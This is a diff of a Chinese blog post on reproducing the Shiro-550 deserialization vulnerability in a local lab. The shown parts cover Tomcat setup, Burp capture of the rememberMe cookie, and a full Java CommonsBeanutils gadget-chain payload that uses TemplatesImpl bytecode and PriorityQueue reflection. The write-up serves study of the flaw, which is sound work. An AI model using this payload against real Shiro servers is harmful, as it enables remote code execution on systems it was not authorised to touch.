@@ -26,9 +26,8 @@
 <meta property="og:site_name" content="bxhhf">
 <meta property="og:description" content="URLDNS验证！CC！CB！">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250515142811341-17478128961311-174798675394349.png">
-<meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250521091406658-17478128982662-174798675922650.png">
-<meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250521151220835-17478129020163-174798676158451.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250515142811341-17478128961311-174798701504259.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250521151220835-17478129020163-174798701216458.png">
 <meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250521151715734-17478129054414-174798676392552.png">
 <meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250515164150697-17479864050891-174798676783953.png">
 <meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250515164810131-17479864068832.png">
@@ -76,15 +75,15 @@
 <meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250523104430680-174798651734343.png">
 <meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250523152049272-174798652012444.png">
 <meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250522230931579-174798652314545.png">
-<meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250523103126149-174798652480046.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250523103126149-174798652480046-174798695899955.png">
 <meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250523103517344.png">
-<meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250523152614267-174798652761347.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250523152614267-174798652761347-174798693599354.png">
 <meta property="og:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250523152849195-174798653032548.png">
 <meta property="article:published_time" content="2025-05-23T07:45:33.000Z">
-<meta property="article:modified_time" content="2025-05-23T07:52:50.924Z">
+<meta property="article:modified_time" content="2025-05-23T07:57:00.103Z">
 <meta property="article:author" content="bxhhf">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250515142811341-17478128961311-174798675394349.png">
+<meta name="twitter:image" content="https://bxhhf.github.io/2025/05/23/Shiro-550/image-20250515142811341-17478128961311-174798701504259.png">
   
   
   
@@ -385,14 +384,13 @@
 </li>
 </ul>
 <p>之后启动时，报404，要加上这两个</p>
-<p><img src="/2025/05/23/Shiro-550/image-20250515142811341-17478128961311-174798675394349.png" srcset="/img/loading.gif" lazyload alt="image-20250515142811341"></p>
-<p>启动tomcat乱码：\conf\logging.properties 文件中这儿的UTF-8改为GBK<img src="/2025/05/23/Shiro-550/image-20250521091406658-17478128982662-174798675922650.png" srcset="/img/loading.gif" lazyload alt="image-20250521091406658"></p>
-<p>localhost:8080访问tomcat启动成功，然后直接用上下文路径访问(<a target="_blank" rel="noopener" href="http://localhost:8123/shirodemo_war/login.jsp">http://localhost:8123/shirodemo_war/login.jsp</a>)</p>
+<p><img src="/2025/05/23/Shiro-550/image-20250515142811341-17478128961311-174798701504259.png" srcset="/img/loading.gif" lazyload alt="image-20250515142811341"></p>
+<p>localhost:8123访问tomcat启动成功，然后直接用上下文路径访问(<a target="_blank" rel="noopener" href="http://localhost:8123/shirodemo_war/login.jsp">http://localhost:8123/shirodemo_war/login.jsp</a>)</p>
 <p>tomcat自己不知道怎么就关了，直接在jdk中运行也是一样的</p>
-<p>然后浏览器插件设置代理模式端口8100，bp监听8100,</p>
+<p>然后浏览器插件设置代理模式端口8100，bp监听8100</p>
 <p>localhost抓不到包，用IPV4的ip去替换访问就可以抓到包了</p>
 <p>root，secret 勾选rememberMe登录抓包，看到向浏览器返回了rememberMe记录身份信息的，下一次就可以直接登录</p>
-<p><img src="/2025/05/23/Shiro-550/image-20250521151220835-17478129020163-174798676158451.png" srcset="/img/loading.gif" lazyload alt="image-20250521151220835"></p>
+<p><img src="/2025/05/23/Shiro-550/image-20250521151220835-17478129020163-174798701216458.png" srcset="/img/loading.gif" lazyload alt="image-20250521151220835"></p>
 <p>下一次直接成功登录了，接下来去分析源码的具体逻辑</p>
 <p><img src="/2025/05/23/Shiro-550/image-20250521151715734-17478129054414-174798676392552.png" srcset="/img/loading.gif" lazyload alt="image-20250521151715734"></p>
 <h1 id="二-逆向分析"><a href="#二-逆向分析" class="headerlink" title="二.逆向分析"></a>二.逆向分析</h1><h2 id="解密，反序列化"><a href="#解密，反序列化" class="headerlink" title="&lt;2.1&gt;解密，反序列化"></a>&lt;2.1&gt;解密，反序列化</h2><ol>
@@ -627,7 +625,7 @@
 </ul>
 <p>这么写还挺简单，不用考虑断开怎么构造了嘿嘿</p>
 <p>报错：</p>
-<p><img src="/2025/05/23/Shiro-550/image-20250523103126149-174798652480046.png" srcset="/img/loading.gif" lazyload alt="image-20250523103126149"></p>
+<p><img src="/2025/05/23/Shiro-550/image-20250523103126149-174798652480046-174798695899955.png" srcset="/img/loading.gif" lazyload alt="image-20250523103126149"></p>
 <p>这是因为</p>
 <p>ysoserial中的CB版本是1.9.2，shiro自带的是1.8.3</p>
 <p><img src="/2025/05/23/Shiro-550/image-20250523103517344.png" srcset="/img/loading.gif" lazyload alt="image-20250523103517344"></p>
@@ -637,7 +635,7 @@
 
 
 <p>shiro打通+1</p>
-<p><img src="/2025/05/23/Shiro-550/image-20250523152614267-174798652761347.png" srcset="/img/loading.gif" lazyload alt="image-20250523152614267"></p>
+<p><img src="/2025/05/23/Shiro-550/image-20250523152614267-174798652761347-174798693599354.png" srcset="/img/loading.gif" lazyload alt="image-20250523152614267"></p>
 <h4 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h4><p>组长的视频中还提到一种断开的点   new PriorityQueue的时候啥都不传，这样就和CB断开了，就可以add两次传数字，再反射修改queue属性了</p>
 <p>payload如下：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>     Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>     nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>     nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>     bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>     Class&lt;TemplatesImpl&gt; c = TemplatesImpl.class;<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>     tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>     tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>     <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>     <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>     bytecodes.set(templates,codes);<br>     <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>     PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;();<br>     queue.add(<span class="hljs-number">2</span>);<br>     queue.add(<span class="hljs-number">1</span>);<br>     <span class="hljs-comment">//add之后再修改回来</span><br>     Class&lt;PriorityQueue&gt; c4 = PriorityQueue.class;<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> c4.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>     comparator.setAccessible(<span class="hljs-literal">true</span>);<br>     comparator.set(queue,beanComparator);<br>     Object[] objects = &#123;templates, templates&#125;;<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">queueField</span> <span class="hljs-operator">=</span> c4.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>     queueField.setAccessible(<span class="hljs-literal">true</span>);<br>     queueField.set(queue,objects);<span class="hljs-comment">//这里注意queue是数组</span><br>     serialize(queue);<br>     unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br></code></pre></td></tr></table></figure>
